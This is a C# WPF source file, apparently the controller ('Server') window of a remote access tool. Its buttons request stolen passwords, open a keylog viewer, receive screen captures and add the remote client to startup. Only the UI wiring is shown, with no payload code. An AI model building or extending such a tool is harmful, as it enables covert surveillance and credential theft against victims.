
using System;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Server.Annotations;
using Protocol;
using Image = System.Drawing.Image;

namespace Server
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>

    public partial class MainWindow : Window
    {
        private readonly Screen ScreenWindow = new Screen();
        private readonly KeyLog KeyLogWindow = new KeyLog();
        private readonly InfoWindow InfoWindow = new InfoWindow();
        private Mutex mutex = new Mutex(false, "Server");

        public MainWindow()
        {
            bool isAnotherInstanceOpen = !mutex.WaitOne(TimeSpan.Zero);
            if (isAnotherInstanceOpen)
            {
                MessageBox.Show("Only one instance of server is allowed");
                Application.Current.Shutdown();
            }
            
            
            InitializeComponent();

            ConnectionManager.ScreenWindow = ScreenWindow;
            ConnectionManager.InfoWindow = InfoWindow;
            
            ConnectionManager.ReceiveScreen();
        }

        private void CloseButton_OnClick(object sender, RoutedEventArgs e)
        {
            ConnectionManager.SendCommand(Commands.Close);
        }

        private void ScreenButton_OnClick(object sender, RoutedEventArgs e)
        {
            ScreenWindow.Show();
        }

        private void KeyLogButton_OnClick(object sender, RoutedEventArgs e)
        {
            KeyLogWindow.Show();
        }

        private void AddToStartupButton_OnClick(object sender, RoutedEventArgs e)
        {
            ConnectionManager.SendCommand(Commands.AddToStartup);
        }

        private void RemoveFromStartupButton_OnClick(object sender, RoutedEventArgs e)
        {
            ConnectionManager.SendCommand(Commands.RemoveFromStartup);
        }

        private void InfoButton_OnClick(object sender, RoutedEventArgs e)
        {
            InfoWindow.Show();
        }

        private void MainWindow_OnClosing(object sender, CancelEventArgs e)
        {
            mutex.ReleaseMutex();
            Application.Current.Shutdown();
        }

        private void PasswordButton_OnClick(object sender, RoutedEventArgs e)
        {
            ConnectionManager.SendCommand(Commands.RequestPasswords);
        }
    }
}
